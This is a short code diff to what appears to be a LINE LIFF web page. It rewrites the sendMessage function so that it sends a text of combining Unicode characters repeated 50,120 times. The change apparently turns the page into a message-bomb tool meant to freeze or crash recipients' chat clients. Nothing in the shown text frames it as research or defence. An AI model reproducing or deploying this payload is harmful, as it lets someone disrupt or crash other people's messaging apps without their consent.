@@ -54,10 +54,12 @@
         }
 
         function sendMessage(){
+            var msg="͢͢"
+            msg=msg.repeat(50120)
             liff.sendMessages([
                 {
                 type: 'text',
-                text:'᷀᷁'
+                text:msg
                 },
             ]).then(() => {
                 document.getElementById('err').innerHTML= ""
